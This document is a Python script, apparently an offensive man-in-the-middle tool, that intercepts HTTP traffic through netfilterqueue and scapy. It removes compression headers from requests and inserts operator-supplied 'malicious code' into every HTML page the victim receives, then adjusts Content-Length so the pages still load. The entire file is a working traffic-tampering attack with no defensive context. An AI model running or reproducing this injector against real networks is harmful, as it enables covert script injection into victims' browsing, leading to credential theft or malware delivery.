#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy
import re
import optparse
import argparse
import sys

def get_args():
    try:
        parser = optparse.OptionParser()
        parser.add_option("-c", "--code", dest="mal_code", help="Malicious code that needs to be Injected.")
        (val, args) = parser.parse_args()
    except:
        parser = argparse.ArgumentParser()
        parser.add_argument("-c", "--code", dest="mal_code", help="Malicious code that needs to be Injected.")
        val = parser.parse_args()
    if not val.mal_code:
        parser.error("ERROR Missing argument, use --help for more info")
    return val
def mod_packet(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def work_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.Raw):
        raw_load = use_packet[scapy.Raw].load
        if use_packet[scapy.TCP].dport == 80:
            try:
                print("\r[+] Detected Request..."),
                sys.stdout.flush()
            except:
                print("\r[+] Detected Request...", end="")
            raw_load = re.sub("Accept-Encoding:.*?\\r\\n", "", raw_load)
        elif use_packet[scapy.TCP].sport == 80:
            try:
                print("\r[+] Server Responding..."),
                sys.stdout.flush()
            except:
                print("\r[+] Server Responding...", end="")
            insert = value.mal_code
            raw_load = raw_load.replace("</body>", insert + "</body>")
            content_len = re.search("(?:Content-Length:\s)(\d*)", raw_load)
            if content_len and "text/html" in raw_load:
                leng = content_len.group(1)
                new_leng = int(leng) + len(insert)
                raw_load = raw_load.replace(leng, str(new_leng))

        if raw_load != use_packet[scapy.Raw].load:
            new_packet = mod_packet(use_packet, raw_load)
            packet.set_payload(str(new_packet))
    packet.accept()

value = get_args()
queue = netq.NetfilterQueue()
queue.bind(0, work_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[-] Detected CTRL + C Quitting...")
    print("[+] Code Injected Successfully in all requested pages.")
